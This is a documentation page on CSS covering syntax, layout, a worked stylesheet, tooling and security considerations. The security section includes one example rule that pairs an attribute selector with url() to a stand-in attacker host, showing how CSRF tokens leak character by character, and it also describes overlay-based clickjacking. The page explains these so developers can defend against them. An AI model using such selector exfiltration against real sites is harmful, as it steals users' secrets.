# CSS

Cascading Style Sheets is the language that controls the presentation of HTML and other markup documents. It sets color, layout, typography, and responsive behavior. CSS separates how a document looks from what it contains. Though often treated as harmless styling, injected CSS can exfiltrate data and enable interface deception.

<!-- meta:start (written by scripts/build_doc_meta.py from data/doc_meta.yaml; do not edit) -->

<table class="tsw-meta-card">
<tr><th scope="row" align="left" valign="top">Who this is for</th><td>

Developers, engineers and analysts who read, write or parse CSS

</td></tr>
<tr><th scope="row" align="left" valign="top">Level</th><td>

Beginner to intermediate

</td></tr>
<tr><th scope="row" align="left" valign="top">Reading time</th><td>

About 4 min (865 words at 230 words a minute)

</td></tr>
<tr><th scope="row" align="left" valign="top">Read this when</th><td>

You are reading or writing CSS by hand or in code, you want a worked example and the tools that handle it, or you are parsing untrusted input and need its security considerations

</td></tr>
<tr><th scope="row" align="left" valign="top">Start at</th><td>

[Syntax and structure](#syntax-and-structure), [A worked example](#a-worked-example), [Security considerations](#security-considerations)

</td></tr>
</table>

<details class="tsw-meta-more"><summary>More about this page (pairs with, last reviewed)</summary>

<table class="tsw-meta-card">
<tr><th scope="row" align="left" valign="top">Pairs with</th><td>

[Secure Coding Reference](/SECURE_CODING_REFERENCE.md), [HTML](/formats/html.md), [Markdown](/formats/markdown.md), [XML](/formats/xml.md)

</td></tr>
<tr><th scope="row" align="left" valign="top">Last reviewed</th><td>

No review recorded yet

</td></tr>
</table>

</details>

<!-- meta:end -->

## What it is and where it is used

CSS declares rules that match elements and assign them style. The browser combines author styles, user styles, and built-in defaults to compute the final appearance of each element.

CSS appears in external stylesheets linked from HTML, in `<style>` blocks, and in inline `style` attributes. It also drives email templates, printable documents, and the rendering of design systems.

## Syntax and structure

A rule has a selector and a declaration block. Each declaration is a property and a value.

```css
h1 {
  color: navy;
  font-size: 2rem;
}
```

Selectors target elements by type, class, id, attribute, or relationship. Combinators express structural relationships between elements.

```css
.card { padding: 1rem; }
#main { max-width: 60ch; }
input[type="email"] { border-color: gray; }
nav > a { text-decoration: none; }
```

The cascade resolves conflicts when several rules match one element. Specificity ranks selectors: inline styles outrank ids, ids outrank classes and attributes, and those outrank element selectors. When specificity ties, the later rule wins.

The box model describes every element as content, surrounded by padding, then a border, then a margin. The `box-sizing` property decides whether width includes padding and border.

```css
* { box-sizing: border-box; }
.panel {
  padding: 16px;
  border: 1px solid silver;
  margin: 8px;
}
```

Flexbox lays out items along one axis. Grid lays out items in two dimensions, in rows and columns.

```css
.row {
  display: flex;
  gap: 1rem;
  justify-content: space-between;
}
.layout {
  display: grid;
  grid-template-columns: 200px 1fr;
  gap: 1rem;
}
```

Custom properties, often called variables, store reusable values. They are read with `var()` and cascade like other properties.

```css
:root { --accent: #2563eb; }
button { background: var(--accent); }
```

Media queries apply rules conditionally, commonly by viewport width, so a layout can adapt to the device.

```css
@media (max-width: 600px) {
  .layout { grid-template-columns: 1fr; }
}
```

## A worked example

```css
:root {
  --space: 1rem;
  --accent: #2563eb;
  --text: #1f2937;
}

* { box-sizing: border-box; }

body {
  margin: 0;
  color: var(--text);
  font-family: system-ui, sans-serif;
}

.page {
  display: grid;
  grid-template-columns: 220px 1fr;
  gap: var(--space);
  max-width: 1100px;
  margin: 0 auto;
  padding: var(--space);
}

.sidebar {
  display: flex;
  flex-direction: column;
  gap: calc(var(--space) / 2);
}

.sidebar a {
  color: var(--accent);
  text-decoration: none;
}

.card {
  padding: var(--space);
  border: 1px solid #e5e7eb;
  border-radius: 8px;
}

@media (max-width: 700px) {
  .page { grid-template-columns: 1fr; }
}
```

## Tooling

Stylelint checks stylesheets for errors and enforces conventions. Prettier formats CSS consistently. PostCSS transforms CSS through plugins, including Autoprefixer for vendor prefixes.

Preprocessors such as Sass and Less add variables, nesting, and functions that compile to plain CSS. Browser developer tools inspect computed styles, the box model, and specificity conflicts at runtime.

## Security relevance

This section is the threat-facing view of CSS: why injected style is more than a cosmetic problem and where it is abused. The validation and loading controls that defend against these are in the "Security considerations" section that follows.

### Where it appears

- Injection points that accept style. A field that lets a user set a theme color, a `style` attribute copied into a page, or a user-supplied stylesheet reference all put attacker-controlled CSS into a trusted document.
- Rendered output that mixes trust levels. Email templates, server-rendered dashboards, and design systems interpolate values into style context, where an unescaped value changes far more than one element.
- Third-party stylesheets. A page that links a stylesheet from an external origin trusts that origin to restyle every control, including a login form.

### Dominant weakness classes

CSS is style, not script, so the risks are exfiltration, injection, and interface deception rather than memory corruption. The defensive settings for each are in the section below.

- Improper neutralization in a style context ([CWE-79](https://cwe.mitre.org/data/definitions/79.html)), where injected CSS, or style parsing that historically crossed into script, becomes a cross-site scripting issue.
- Exposure of sensitive information ([CWE-200](https://cwe.mitre.org/data/definitions/200.html)) through attribute selectors and `url()`, which leak a secret attribute value one character at a time and reconstruct CSRF tokens rendered into the page.
- Improper restriction of rendered UI layers ([CWE-1021](https://cwe.mitre.org/data/definitions/1021.html)), the clickjacking and overlay deception an attacker builds by resizing, hiding, or stacking controls.

### Why it matters

Recognizing a point where user input reaches style context tells a tester to try selector-based exfiltration of tokens and overlay-based UI redress, both of which work without any script running. See [the web application security reference](/WEB_APPLICATION_SECURITY_REFERENCE.md) for the surrounding method.

## Security considerations

CSS is not script, but injecting attacker-controlled CSS into a page is a real risk. An injection point that accepts style can read page state and send it elsewhere.

Attribute selectors combined with `url()` enable data exfiltration. A rule such as `input[value^="a"] { background: url(https://attacker/a); }` fires a request that leaks a character of a secret value. Repeated across prefixes, this reconstructs tokens, including CSRF tokens rendered into attributes.

Never place untrusted input into a `style` attribute, a `<style>` block, or a stylesheet path without strict validation. Treat dynamic style the way you treat dynamic markup.

In some legacy contexts, style parsing can lead into script execution, which makes the injection a cross-site scripting issue (CWE-79). Expression-style constructs and certain url handling have historically crossed from style into script.

CSS can also deceive. An attacker who controls style can resize, hide, or overlay elements to trick a user into clicking an unintended control, a technique adjacent to clickjacking. Enforce framing and overlay protections at the application level rather than trusting layout.

Load stylesheets only from origins you control or trust. A compromised third-party stylesheet can restyle a login form into a trap. Use Subresource Integrity on external stylesheets where feasible.

See /SECURE_CODING_REFERENCE.md for input validation and output encoding practice that applies to style context as well as markup.

## Resources

The W3C CSS specifications define the language across modules such as Selectors, Cascade and Inheritance, Box Model, Flexible Box Layout, and Grid Layout. MDN Web Docs documents properties, selectors, and browser support with current behavior.

## Related pages

- [Data formats and regular expressions](/formats/README.md)
- [Secure Coding Reference](/SECURE_CODING_REFERENCE.md)
- [HTML](/formats/html.md)
- [Markdown](/formats/markdown.md)
- [XML](/formats/xml.md)
